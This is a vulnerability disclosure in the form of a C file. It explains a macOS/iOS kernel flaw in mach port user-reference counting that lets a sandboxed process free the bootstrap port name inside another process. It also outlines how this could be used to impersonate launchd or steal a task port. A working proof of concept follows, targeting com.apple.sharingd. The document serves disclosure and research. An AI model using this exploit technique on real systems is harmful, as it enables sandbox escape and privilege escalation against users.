// ianbeer

#if 0
Broken kernel mach port name uref handling on iOS/MacOS can lead to privileged port name replacement in other processes

When sending and receiving mach messages from userspace there are two important kernel objects; ipc_entry and
ipc_object.

ipc_entry's are the per-process handles or names which a process uses to refer to a particular ipc_object.

ipc_object is the actual message queue (or kernel object) which the port refers to.

ipc_entrys have a pointer to the ipc_object they are a handle for along with the ie_bits field which contains
the urefs and capacility bits for this name/handle (whether this is a send right, receive right etc.)

  struct ipc_entry {
    struct ipc_object *ie_object;
    ipc_entry_bits_t ie_bits;
    mach_port_index_t ie_index;
    union {
      mach_port_index_t next;   /* next in freelist, or...  */
      ipc_table_index_t request;  /* dead name request notify */
    } index;
  };

#define IE_BITS_UREFS_MASK  0x0000ffff  /* 16 bits of user-reference */
#define IE_BITS_UREFS(bits) ((bits) & IE_BITS_UREFS_MASK)

The low 16 bits of the ie_bits field are the user-reference (uref) count for this name.

Each time a new right is received by a process, if it already had a name for that right the kernel will
increment the urefs count. Userspace can also arbitrarily control this reference count via mach_port_mod_refs
and mach_port_deallocate. When the reference count hits 0 the entry is free'd and the name can be re-used to
name another right.

ipc_right_copyout is called when a right will be copied into a space (for example by sending a port right in a mach
message to another process.) Here's the code to handle the sending of a send right:

    case MACH_MSG_TYPE_PORT_SEND:
        assert(port->ip_srights > 0);
        
        if (bits & MACH_PORT_TYPE_SEND) {
            mach_port_urefs_t urefs = IE_BITS_UREFS(bits);
            
            assert(port->ip_srights > 1);
            assert(urefs > 0);
            assert(urefs < MACH_PORT_UREFS_MAX);
            
            if (urefs+1 == MACH_PORT_UREFS_MAX) {
                if (overflow) {
                    /* leave urefs pegged to maximum */     <---- (1)
                    
                    port->ip_srights--;
                    ip_unlock(port);
                    ip_release(port);
                    return KERN_SUCCESS;
                }
                
                ip_unlock(port);
                return KERN_UREFS_OVERFLOW;
            }
            port->ip_srights--;
            ip_unlock(port);
            ip_release(port);
       
     ...     
        
        entry->ie_bits = (bits | MACH_PORT_TYPE_SEND) + 1;  <---- (2)
        ipc_entry_modified(space, name, entry);
        break;


If copying this right into this space would cause that right's name's urefs count in that space to hit 0xffff
then (if overflow is true) we reach the code at (1) which claims in the comment that it will leave urefs pegged at maximum.
This branch doesn't increase the urefs but still returns KERN_SUCCESS. Almost all callers pass overflow=true.

The reason for this "pegging" was probably not to prevent the reference count from becoming incorrect but rather because
at (2) if the urefs count wasn't capped the reference count would overflow the 16-bit bitfield into the capability bits.

The issue is that the urefs count isn't "pegged" at all. I would expect "pegged" to mean that the urefs count will now stay at 0xfffe
and cannot be decremented - leaking the name and associated ipc_object but avoiding the possibilty of a name being over-released.

In fact all that the "peg" does is prevent the urefs count from exceeding 0xfffe; it doesn't prevent userspace from believing
it has more urefs than that (by eg making the copyout's fail.)

What does this actually mean?

Let's consider the behaviour of mach_msg_server or dispatch_mig_server. They receive mach service messages in a loop and if the message
they receieved didn't corrispond to the MIG schema they pass that received message to mach_msg_destroy. Here's the code where mach_msg_destroy
destroys an ool_ports_descriptor_t:

    case MACH_MSG_OOL_PORTS_DESCRIPTOR : {
      mach_port_t                 *ports;
      mach_msg_ool_ports_descriptor_t *dsc;
      mach_msg_type_number_t      j;

      /*
       * Destroy port rights carried in the message 
       */
      dsc = &saddr->ool_ports;
      ports = (mach_port_t *) dsc->address;
      for (j = 0; j < dsc->count; j++, ports++)  {
          mach_msg_destroy_port(*ports, dsc->disposition); // calls mach_port_deallocate
      }
    ...

This will call mach_port_deallocate for each ool_port name received.

If we send such a service a mach message with eg 0x20000 copies of the same port right as ool ports the ipc_entry for that name will actually only have
0xfffe urefs. After 0xfffe calls to mach_port_deallocate the urefs will hit 0 and the kernel will free the ipc_entry and mark that name as free. From this
point on the name can be re-used to name another right (for example by sending another message received on another thread) but the first thread will
still call mach_port_deallocate 0x10002 times on that name.

This leads to something like a use-after-deallocate of the mach port name - strictly a userspace bug (there's no kernel memory corruption etc here) but
caused by a kernel bug.

** Doing something interesting **

Here's one example of how this bug could be used to elevate privileges/escape from sandboxes:

All processes have send rights to the bootstrap server (launchd). When they wish to lookup a service they send messages to this port.

Process A and B run as the same user; A is sandboxed, B isn't. B implements a mach service and A has looked up a send right to the service vended by
B via launchd.

Process A builds a mach message with 0x10000 ool send rights to the bootstrap server and sends this message to B. B receives the message inside mach_msg_server
(or a similar function.) When the kernel copies out this message to process B it sees that B already has a name for the boostrap port so increments the urefs count
for that name for each ool port in the message - there are 0x10000 of those but the urefs count stops incrementing at 0xfffe (but the copy outs still succeed and
process B sees 0x10000 copies of the same name in the received ool ports descriptor.)

Process B sees that the message doesn't match its MIG schema and passes it to mach_msg_destroy, which calls mach_port_deallocate 0x10000 times, destroying the rights
carried in the ool ports; since the bootstrap_port name only has 0xfffe urefs after the 0xfffe'th mach_port_deallocate this actually frees the boostrap_port's
name in process B meaning that it can be reused to name another port right. The important thing to notice here is that process B still believes that the name names
a send right to launchd (and it will just read the name from the bootstrap_port global variable.)

Process A can then allocate new mach port receive rights and send another message containing send rights to these new ports to process B and try to get the old name
reused to name one of these send rights - now when process B tries to communicate with launchd it will instead be communicating with process A.

Turning this into code execution outside of the sandbox would depend on what you could transativly do by impersonating launchd in such a fashion but it's surely possible.

Another approach with a more clear path to code execution would be to replace the IOKit master device port using the same technique - there's then a short path to getting
the target's task port if it tries to open a new IOKit user client since it will pass its task port to io_service_open_extended.

** poc **

This PoC just demonstrates the ability to cause the boostrap port name to be freed in another process - this should be proof enough that there's a very serious bug here.

Use a kernel debugger and showtaskrights to see that sharingd's name for the bootstrap port has been freed but that in userspace the bootstrap_port global is still the old name.

I will work on a full exploit but it's a non-trivial task! Please reach out to me ASAP if you require any futher information about the impact of this bug.

Tested on MacOS Sierra 10.12 (16A323)

#endif



#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <servers/bootstrap.h>
#include <mach/mach.h>

// a service
char* service_name = "com.apple.sharingd";

struct ool_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports;
};

mach_port_t lookup(char* name) {
  mach_port_t bs = MACH_PORT_NULL;
  task_get_bootstrap_port(mach_task_self(), &bs);

  if (bs == MACH_PORT_NULL) {
    printf("unable to get bootstrap port\n");
    return MACH_PORT_NULL;
  }

  mach_port_t service_port = MACH_PORT_NULL;
  kern_return_t err = bootstrap_look_up(bs, name, &service_port);
  if(err != KERN_SUCCESS){
    printf("unable to look up %s\n", name);
    return MACH_PORT_NULL;
  }
  
  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return 1;
  }
  return service_port;
}

int main() {
  kern_return_t err;

  mach_port_t service_port = lookup(service_name);
  mach_port_t target_port = bootstrap_port; // the port we'll free

  printf("pid:%d\n", getpid());

  int port_count = 0x10010;
  mach_port_t* ports = malloc(port_count * sizeof(mach_port_t));
  for (int i = 0; i < port_count; i++) {
    ports[i] = target_port;
  }

  // build the message to free the target port name
  struct ool_msg* free_msg = malloc(sizeof(struct ool_msg));
  memset(free_msg, 0, sizeof(struct ool_msg));

  free_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  free_msg->hdr.msgh_size = sizeof(struct ool_msg);
  free_msg->hdr.msgh_remote_port = service_port;
  free_msg->hdr.msgh_local_port = MACH_PORT_NULL;
  free_msg->hdr.msgh_id = 0x1234;

  free_msg->body.msgh_descriptor_count = 1;
  
  free_msg->ool_ports.address = ports;
  free_msg->ool_ports.count = port_count;
  free_msg->ool_ports.deallocate = 0;
  free_msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
  free_msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
  free_msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

  // send the free message
  err = mach_msg(&free_msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL); 
  printf("free message: %s\n", mach_error_string(err));

  return 0;
}
